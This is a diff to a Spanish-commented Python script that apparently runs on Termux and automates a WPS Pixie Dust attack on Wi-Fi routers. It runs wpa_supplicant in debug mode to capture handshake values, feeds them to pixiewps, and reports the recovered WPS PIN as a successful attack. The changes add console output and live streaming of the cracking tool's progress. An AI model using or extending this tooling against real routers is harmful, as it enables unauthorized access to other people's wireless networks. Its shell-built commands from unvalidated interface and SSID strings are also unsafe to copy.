@@ -2,6 +2,7 @@ import subprocess
 import re
 import os
 import tempfile
+import time
 
 def run_command(command, use_sudo=False):
     """Ejecuta un comando de shell y muestra la salida"""
@@ -72,7 +73,12 @@ def capture_wps_data(interface, ssid):
     conf_file = create_wpa_supplicant_conf(ssid)
     wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"  # Ruta completa de wpa_supplicant
     wpa_supplicant_command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
+    print(f"Ejecutando wpa_supplicant: {wpa_supplicant_command}")
     stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)
+
+    print("Salida de wpa_supplicant:")
+    print(stdout)
+    print(stderr)
 
     pke = extract_value(stdout, "PKE:")
     pkr = extract_value(stdout, "PKR:")
@@ -102,19 +108,30 @@ def perform_pixie_dust_attack(interface, ssid):
     # Ejecutar pixiewps con los valores capturados
     pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
     print(f"Ejecutando pixiewps: {pixiewps_command}")
-    pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)
+    process = subprocess.Popen(pixiewps_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    while True:
+        output = process.stdout.readline()
+        if output == b'' and process.poll() is not None:
+            break
+        if output:
+            os.system('clear')
+            print(output.strip().decode())
+        time.sleep(0.1)
+
+    pixie_stdout, pixie_stderr = process.communicate()
 
     print("Salida de pixiewps:")
-    print(pixie_stdout)
-    print(pixie_stderr)
+    print(pixie_stdout.decode())
+    print(pixie_stderr.decode())
 
-    if "WPS pin:" in pixie_stdout:
-        pin = extract_value(pixie_stdout, "WPS pin:")
+    if "WPS pin:" in pixie_stdout.decode():
+        pin = extract_value(pixie_stdout.decode(), "WPS pin:")
         print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
         return pin
     else:
         print("\nPixie Dust no pudo encontrar el PIN.")
-        print(pixie_stdout)
+        print(pixie_stdout.decode())
         return None
 
 def main():
